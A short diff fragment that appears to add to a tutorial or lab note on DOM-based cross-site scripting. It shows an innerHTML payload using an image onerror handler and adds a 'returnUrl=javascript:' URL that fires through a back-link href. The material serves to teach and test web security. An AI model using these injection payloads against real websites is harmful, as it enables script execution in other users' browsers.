@@ -142,3 +142,4 @@ Example: element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
 # After the page's JavaScript applies this malicious URL to the back link's href, clicking on the back link will execute it: 
 
       
+?returnUrl=javascript:alert(document.domain)
